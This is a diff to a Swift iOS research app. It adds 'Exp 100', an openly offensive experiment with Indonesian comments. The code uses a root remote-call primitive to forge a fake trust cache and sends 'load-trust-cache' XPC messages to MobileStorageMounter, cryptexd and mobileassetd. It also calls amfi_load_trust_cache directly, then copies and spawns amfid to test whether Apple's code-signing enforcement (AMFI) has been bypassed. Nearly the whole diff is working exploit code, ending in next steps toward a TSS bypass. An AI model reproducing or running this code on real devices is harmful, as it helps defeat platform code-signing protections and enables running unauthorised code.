@@ -974,6 +974,16 @@ struct AMFIExperimentView: View {
                 )
 
                 pathButton(
+                    title: "③v TC Load XPC (Exp 100)",
+                    icon: "arrow.down.circle.fill",
+                    color: .green,
+                    label: "TC Load",
+                    action: runExp100TCLoadXPC,
+                    needsVerified: false,
+                    needsProbe: false
+                )
+
+                pathButton(
                     title: "③p Heap TC Scan (Exp 94)",
                     icon: "magnifyingglass.circle",
                     color: .orange,
@@ -9722,6 +9732,235 @@ struct AMFIExperimentView: View {
         }
 
         return ExperimentResult(name: expName, success: !findings.isEmpty, detail: detail, timestamp: Date())
+    }
+    #endif
+
+    // MARK: - Exp 100: Trust Cache Load via XPC
+
+    /// Exp 100: Trigger trust cache load via MobileStorageMounter/mobileassetd XPC.
+    /// Kedua daemon punya entitlement pmap.load-trust-cache.
+    /// Test: connect ke XPC service, kirim message untuk load TC.
+    private func runExp100TCLoadXPC() {
+        isRunning = true
+        runningLabel = "TC Load"
+        guard mgr.rcready else {
+            isRunning = false; runningLabel = ""; return
+        }
+        #if !DISABLE_REMOTECALL
+        root.executeAsRoot(operation: "exp100_tc_load") { rc in
+            let result = self.expTCLoadXPC(rc: rc)
+            DispatchQueue.main.async {
+                self.results.insert(result, at: 0)
+                self.isRunning = false; self.runningLabel = ""
+            }
+            return (result.success, result.detail.prefix(80).description, 0)
+        }
+        #else
+        isRunning = false; runningLabel = ""
+        #endif
+    }
+
+    #if !DISABLE_REMOTECALL
+    private func expTCLoadXPC(rc: RemoteCall) -> ExperimentResult {
+        let expName = "TC Load XPC (Exp 100)"
+        var detail = "Experiment 100: Trust Cache Load via XPC\n"
+        detail += "==========================================\n\n"
+        detail += "Target: MobileStorageMounter & mobileassetd\n"
+        detail += "Kedua punya entitlement pmap.load-trust-cache\n\n"
+
+        let mem = rc.trojanMem
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+
+        // Step 1: Write fake trust cache ke /private/var/tmp/
+        detail += "=== Step 1: Write fake trust cache ===\n"
+
+        let tcPath = "/private/var/tmp/com.apple.mobile_storage_mounter/.fake_tc"
+        let tcPathAddr = remote_alloc_str(rc, tcPath)
+
+        // Buat directory dulu
+        let dirPath = remote_alloc_str(rc, "/private/var/tmp/com.apple.mobile_storage_mounter")
+        RootExecutor.rcall(rc, "mkdir", dirPath, 0o755)
+        RootExecutor.rcall(rc, "free", dirPath)
+
+        // Write minimal trust cache v2 struct
+        RootExecutor.rcall(rc, "unlink", tcPathAddr)
+        let fd = RootExecutor.rcall(rc, "open", tcPathAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
+
+        if fd != UInt64(bitPattern: -1) {
+            let tcBuf = mem + 0x800
+            // Trust cache v2: version(4) + uuid(16) + count(4) + entries
+            rc[tcBuf + 0].setValue32(2)       // version = 2
+            rc[tcBuf + 4].setValue64(0)       // uuid[0..7]
+            rc[tcBuf + 12].setValue64(0)      // uuid[8..15]
+            rc[tcBuf + 20].setValue32(1)      // count = 1
+            // Entry: fake CDHash (20 bytes) + hashType(1) + flags(1) + pad(2)
+            rc[tcBuf + 24].setValue64(0xDEADBEEFCAFEBABE)
+            rc[tcBuf + 32].setValue64(0x1337133713371337)
+            rc[tcBuf + 40].setValue32(0x0002DEAD)  // last 4 bytes CDHash + hashType=2
+            RootExecutor.rcall(rc, "write", fd, tcBuf, 48)
+            RootExecutor.rcall(rc, "close", fd)
+            detail += "Fake TC written to \(tcPath)\n\n"
+        } else {
+            detail += "Cannot create TC file\n\n"
+        }
+
+        // Step 2: Try connect ke MobileStorageMounter XPC
+        detail += "=== Step 2: XPC connections ===\n"
+
+        let xpcServices = [
+            "com.apple.mobile.storage_mounter",
+            "com.apple.mobile.storage_mounter.xpc",
+            "com.apple.security.cryptexd",
+            "com.apple.mobileassetd",
+        ]
+
+        let xpcConnect = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
+                                            remote_alloc_str(rc, "xpc_connection_create_mach_service"))
+        let xpcResume = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(rc, "xpc_connection_resume"))
+        let xpcDictCreate = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
+                                              remote_alloc_str(rc, "xpc_dictionary_create"))
+        let xpcDictSetStr = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
+                                              remote_alloc_str(rc, "xpc_dictionary_set_string"))
+        let xpcSend = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
+                                         remote_alloc_str(rc, "xpc_connection_send_message"))
+
+        detail += "xpc_connection_create: 0x\(String(format: "%llx", xpcConnect))\n"
+        detail += "xpc_connection_resume: 0x\(String(format: "%llx", xpcResume))\n"
+        detail += "xpc_dictionary_create: 0x\(String(format: "%llx", xpcDictCreate))\n\n"
+
+        guard xpcConnect != 0 && xpcResume != 0 && xpcDictCreate != 0 else {
+            detail += "XPC functions not available\n"
+            RootExecutor.rcall(rc, "unlink", tcPathAddr)
+            RootExecutor.rcall(rc, "free", tcPathAddr)
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        var anyConnected = false
+
+        for service in xpcServices {
+            let svcAddr = remote_alloc_str(rc, service)
+
+            // xpc_connection_create_mach_service(name, NULL, 0)
+            let conn = RootExecutor.rcall(rc, "xpc_connection_create_mach_service", svcAddr, 0, 0)
+            detail += "[\(service)]:\n"
+            detail += "  connection: 0x\(String(format: "%llx", conn))\n"
+
+            if conn != 0 {
+                anyConnected = true
+
+                // Resume connection
+                RootExecutor.rcallAddr(rc, xpcResume, conn)
+
+                // Create message dictionary
+                let msg = RootExecutor.rcallAddr(rc, xpcDictCreate, 0, 0, 0)
+                detail += "  message: 0x\(String(format: "%llx", msg))\n"
+
+                if msg != 0 && xpcDictSetStr != 0 {
+                    // Set "path" key to our trust cache
+                    let keyPath = remote_alloc_str(rc, "path")
+                    let keyAction = remote_alloc_str(rc, "action")
+                    let valLoad = remote_alloc_str(rc, "load-trust-cache")
+
+                    RootExecutor.rcallAddr(rc, xpcDictSetStr, msg, keyPath, tcPathAddr)
+                    RootExecutor.rcallAddr(rc, xpcDictSetStr, msg, keyAction, valLoad)
+
+                    // Send message
+                    if xpcSend != 0 {
+                        RootExecutor.rcallAddr(rc, xpcSend, conn, msg)
+                        detail += "  Sent load-trust-cache message!\n"
+                    }
+
+                    RootExecutor.rcall(rc, "free", keyPath)
+                    RootExecutor.rcall(rc, "free", keyAction)
+                    RootExecutor.rcall(rc, "free", valLoad)
+                }
+            } else {
+                detail += "  FAILED to connect\n"
+            }
+            RootExecutor.rcall(rc, "free", svcAddr)
+            detail += "\n"
+        }
+
+        // Step 3: Also try direct function call amfi_load_trust_cache
+        detail += "=== Step 3: Direct amfi_load_trust_cache ===\n"
+
+        let amfiLoadTC = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
+                                            remote_alloc_str(rc, "amfi_load_trust_cache"))
+        detail += "amfi_load_trust_cache: 0x\(String(format: "%llx", amfiLoadTC))\n"
+
+        if amfiLoadTC != 0 {
+            // amfi_load_trust_cache(data, size) — try calling directly
+            let tcBuf = mem + 0x800
+            let ret = RootExecutor.rcallAddr(rc, amfiLoadTC, tcBuf, 48)
+            detail += "Direct call ret: \(ret)\n"
+            if ret == 0 {
+                detail += "RET=0! Trust cache mungkin loaded!\n"
+            } else {
+                detail += "Failed (expected — needs entitlement)\n"
+            }
+        } else {
+            detail += "Not found in shared cache\n"
+        }
+
+        // Step 4: Try posix_spawn setelah TC load attempt
+        detail += "\n=== Step 4: Test spawn ===\n"
+        let testPath = "/var/containers/Bundle/.exp100_test"
+        let testAddr = remote_alloc_str(rc, testPath)
+
+        // Copy amfid ke test path
+        let srcAddr = remote_alloc_str(rc, "/usr/libexec/amfid")
+        let srcFd = RootExecutor.rcall(rc, "open", srcAddr, UInt64(O_RDONLY), 0)
+        let dstFd = RootExecutor.rcall(rc, "open", testAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
+        if srcFd != UInt64(bitPattern: -1) && dstFd != UInt64(bitPattern: -1) {
+            let buf = mem + 0x2000
+            for _ in 0..<256 {
+                let n = RootExecutor.rcall(rc, "read", srcFd, buf, 4096)
+                if n == 0 || n == UInt64(bitPattern: -1) { break }
+                RootExecutor.rcall(rc, "write", dstFd, buf, n)
+                if n < 4096 { break }
+            }
+        }
+        RootExecutor.rcall(rc, "close", srcFd)
+        RootExecutor.rcall(rc, "close", dstFd)
+        RootExecutor.rcall(rc, "chmod", testAddr, 0o755)
+
+        let (ret, pid, err) = doSpawn(rc: rc, path: testPath, mem: mem)
+        detail += "posix_spawn: ret=\(ret), pid=\(pid), errno=\(err)\n"
+        if ret == 0 && pid != 0 {
+            let (sig, code) = doWait(rc: rc, pid: pid, mem: mem)
+            detail += "exit: signal=\(sig), code=\(code)\n"
+            if sig != 9 {
+                detail += "\nNO SIGKILL! Trust cache load mungkin berhasil!\n"
+            } else {
+                detail += "\nSIGKILL — TC load tidak berhasil (expected)\n"
+            }
+        }
+
+        // Cleanup
+        RootExecutor.rcall(rc, "unlink", tcPathAddr)
+        RootExecutor.rcall(rc, "unlink", testAddr)
+        RootExecutor.rcall(rc, "free", tcPathAddr)
+        RootExecutor.rcall(rc, "free", testAddr)
+        RootExecutor.rcall(rc, "free", srcAddr)
+
+        // Verdict
+        detail += "\n=== VERDICT ===\n"
+        if anyConnected {
+            detail += "XPC connections berhasil dibuat!\n"
+            detail += "Message sent ke services.\n"
+            detail += "Tapi TC load kemungkinan di-reject karena:\n"
+            detail += "  1. Trust cache tidak personalized (no Image4 signature)\n"
+            detail += "  2. Launchd tidak punya entitlement yang dibutuhkan\n"
+            detail += "  3. Message format salah\n\n"
+            detail += "NEXT: Coba dari MobileStorageMounter context langsung\n"
+            detail += "atau craft personalized trust cache (butuh TSS bypass)\n"
+        } else {
+            detail += "Tidak bisa connect ke XPC services dari launchd.\n"
+            detail += "Services mungkin butuh specific entitlement untuk connect.\n"
+        }
+
+        return ExperimentResult(name: expName, success: anyConnected, detail: detail, timestamp: Date())
     }
     #endif
 
